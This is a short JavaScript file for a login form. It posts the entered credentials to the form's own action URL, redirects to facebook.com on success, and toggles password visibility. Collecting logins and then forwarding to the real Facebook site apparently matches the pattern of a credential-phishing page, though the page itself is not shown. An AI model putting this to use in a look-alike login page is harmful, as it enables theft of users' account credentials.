const form = document.getElementById('loginForm');

async function handleSubmit(event) {
    event.preventDefault();
    
    const formData = new FormData(form);
    
    try {
        const response = await fetch(form.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        });
        
        if (response.ok) {
            window.location.href = "https://www.facebook.com";
        } else {
            const data = await response.json();
            alert(data.error || 'Login failed. Please try again.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('An error occurred. Please try again later.');
    }
}

form.addEventListener('submit', handleSubmit);

// Toggle password visibility
const togglePassword = document.getElementById('togglePassword');
const passwordInput = document.getElementById('password');
const eyeIcon = document.getElementById('eyeIcon');

togglePassword.addEventListener('click', function() {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    eyeIcon.classList.toggle('fa-eye');
    eyeIcon.classList.toggle('fa-eye-slash');
});

// Create Account button
document.querySelector('.create-account-btn').addEventListener('click', function() {
    alert('Sign up functionality would be implemented separately');
});